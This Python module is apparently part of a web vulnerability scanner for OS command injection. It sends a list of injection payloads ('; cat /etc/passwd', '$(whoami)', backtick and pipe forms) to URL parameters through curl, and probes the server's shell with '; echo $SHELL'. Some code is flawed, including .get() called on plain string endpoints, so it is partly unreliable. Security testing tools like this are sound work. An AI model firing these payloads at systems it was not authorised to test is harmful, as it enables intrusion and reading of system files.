"""
Command injection scanning module.
"""

import logging
import subprocess
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

CMDI_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "&& ls -la",
    "\nls -la",
    "%0Als -la",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "; id",
    "| id",
    "; uname -a",
    "| uname -a",
    "$(whoami)",
    "${whoami}",
    "`whoami`",
    "|| whoami",
    "| whoami",
    "|| cat /etc/hostname",
]

SHELL_META_CHARS = [
    ";",
    "|",
    "&",
    "\n",
    "\r",
    "%0a",
    "%0d",
    "&&",
    "||",
    "$(`",
    "`",
]


class CommandInjector:
    """Command injection vulnerability scanner."""

    def __init__(self):
        self.payloads = CMDI_PAYLOADS
        self.shell_chars = SHELL_META_CHARS

    def test_parameter(
        self,
        url: str,
        param: str,
    ) -> Dict:
        """Test a parameter for command injection."""
        results = {
            "url": url,
            "parameter": param,
            "tests": [],
            "vulnerable": False,
            "evidence": None,
        }

        for payload in self.payloads[:10]:
            test_value = f"{param}={payload}"

            try:
                cmd = [
                    "curl", "-s", "-w", "\\n%{http_code}",
                    f"{url}?{test_value}",
                ]

                proc_result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )

                if proc_result.returncode == 0:
                    output = proc_result.stdout
                    lines = output.strip().split("\n")
                    status = int(lines[-1]) if lines else 0
                    body = "\n".join(lines[:-1]) if len(lines) > 1 else output

                    vuln_indicators = [
                        "uid=",
                        "root:",
                        "daemon:",
                        "/bin/bash",
                        "/bin/sh",
                        "Linux",
                        "whoami",
                        "Commands",
                        "total ",
                    ]

                    has_indicator = any(
                        ind.lower() in body.lower()
                        for ind in vuln_indicators
                    )

                    results["tests"].append({
                        "payload": payload,
                        "status": status,
                        "injected_output": has_indicator,
                    })

                    if has_indicator:
                        results["vulnerable"] = True
                        results["evidence"] = body[:500]

            except Exception as e:
                logger.debug(f"Error testing {param}: {e}")

        return results

    def detect_shell(
        self,
        url: str,
        param: str,
    ) -> Optional[str]:
        """Detect the shell being used."""
        test_payloads = [
            ("; echo $SHELL", "sh"),
            ("& echo $SHELL", "sh"),
            ("; printf $SHELL", "sh"),
            ("\nprintf $SHELL", "sh"),
        ]

        for payload, shell in test_payloads:
            try:
                cmd = [
                    "curl", "-s", f"{url}?{param}={payload}",
                ]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10,
                )

                if shell in result.stdout:
                    return shell

            except Exception:
                pass

        return "unknown"


class OSCommandScanner:
    """Scan for OS command injection."""

    def __init__(self):
        self.test_commands = [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "ls -la",
        ]

    async def scan_endpoint(
        self,
        endpoint: str,
        param: str,
    ) -> Dict:
        """Scan endpoint for command injection."""
        results = {
            "endpoint": endpoint,
            "parameter": param,
            "vulnerable": False,
            "shell": None,
        }

        injector = CommandInjector()
        test_result = injector.test_parameter(endpoint, param)
        results["vulnerable"] = test_result.get("vulnerable", False)
        results["tests"] = test_result.get("tests", [])

        if results["vulnerable"]:
            results["shell"] = injector.detect_shell(endpoint, param)

        return results


async def run_cmdi_scan(
    target_id: str,
    endpoints: List[str],
) -> dict:
    """Run command injection scan on endpoints."""
    scanner = CommandInjector()

    all_results = []
    vulnerable_count = 0

    for endpoint in endpoints:
        url = endpoint.get("url", endpoint)
        param = endpoint.get("param", "cmd")

        result = scanner.test_parameter(url, param)
        all_results.append(result)

        if result.get("vulnerable"):
            vulnerable_count += 1

    return {
        "target_id": target_id,
        "total_endpoints": len(endpoints),
        "vulnerable": vulnerable_count,
        "results": all_results,
    }